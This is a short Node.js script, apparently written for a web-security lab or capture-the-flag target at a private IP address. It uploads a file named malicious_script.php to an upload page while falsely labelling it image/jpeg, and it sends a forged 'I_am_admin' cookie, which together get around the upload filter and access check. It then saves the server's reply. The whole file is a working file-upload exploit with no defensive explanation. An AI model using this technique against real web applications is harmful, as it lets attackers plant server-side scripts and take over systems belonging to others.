import fs from "fs/promises";
import { readFile, appendFile } from "node:fs/promises";

//maybe i can show only in browser console ?
// const scriptPath = "malicious_script.js";
const scriptPath = "./malicious_script.php";
const resultFilePath = "./result.html";
const adress = "10.171.57.148";

async function main() {
  const form = new FormData();
  const file = await fs.readFile(`./${scriptPath}`);
  // обертка для хранения файла а памяти
  const blob = new Blob([file], { type: "image/jpeg" });

  form.append("uploaded", blob, {
    contentType: "image/jpeg",
    filename: scriptPath,
  });
  form.append("MAX_FILE_SIZE", 10_000);
  form.append("Upload", "Upload");

  try {
    const response = await fetch(`http://${adress}/?page=upload`, {
      headers: {
        accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        cookie: "I_am_admin=68934a3e9455fa72420237eb05902327",
        Referer: `http://${adress}/?page=upload`,
        "Referrer-Policy": "strict-origin-when-cross-origin",
      },
      body: form,
      method: "POST",
    });

    const res = await response.text();
    await appendFile(resultFilePath, res, "utf8");
  } catch (e) {
    console.error(e);
  }
}

main();
